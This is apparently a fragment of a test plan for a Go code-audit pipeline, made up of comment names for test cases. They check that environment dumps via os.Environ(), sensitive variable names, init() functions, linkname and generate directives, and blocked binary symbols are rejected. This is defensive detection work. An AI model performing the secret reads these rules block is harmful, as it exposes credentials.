    // Test: os.Environ() is rejected
    // Test: sensitive env var name is rejected
    // Test: goroutine in non-concurrent category is rejected
    // Test: init() function is rejected
    // Test: go:linkname directive is rejected
    // Test: go:generate directive is rejected
    // Test: nosec annotation is stripped before audit
    // Test: binary over 50MB is rejected
    // Test: dynamically linked binary is rejected
    // Test: blocked symbol in binary is rejected
    // Test: clean script passes all checks
    // Test: gosec HIGH finding causes rejection
    // Test: gosec MEDIUM finding passes with warning
    // Test: tool not found results in clear error
    // Test: tool crash results in REJECT (fail-closed)
}
```

Each anti-pattern from Section 7 becomes a test case: write the malicious Go source, run the pipeline, assert REJECT with the expected rule ID.
